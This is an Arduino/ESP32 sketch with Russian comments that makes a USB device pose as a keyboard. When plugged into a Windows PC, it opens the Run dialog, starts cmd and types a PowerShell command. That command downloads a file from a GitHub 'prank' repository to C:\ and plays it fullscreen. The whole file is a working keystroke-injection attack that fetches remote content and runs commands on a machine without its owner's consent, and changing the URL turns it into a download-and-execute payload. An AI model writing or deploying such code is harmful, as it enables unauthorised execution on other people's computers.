#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();

  delay(3000); // ждём, пока ПК определит устройство

  // 1. Открываем "Выполнить" (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1500);

  // 2. Запускаем cmd
  Keyboard.print("cmd");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000); // ждём открытия окна cmd

  // 3. Вводим команду PowerShell
  String cmd =
    "powershell -Command \""
    "iwr -uri 'https://github.com/tttimirtt-spec/prank/raw/main/video.mp4' -outfile C:\\video.mp4; "
    "if (Test-Path 'C:\\Program Files\\Windows Media Player\\wmplayer.exe') "
    "{ saps 'C:\\Program Files\\Windows Media Player\\wmplayer.exe' -ArgumentList '/fullscreen','C:\\video.mp4' } "
    "else "
    "{ saps C:\\video.mp4; sleep 4; (New-Object -ComObject WScript.Shell).SendKeys('{F11}') }"
    "\"";

  Keyboard.print(cmd);
  delay(500);

  // 4. Enter
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
}

void loop() {}
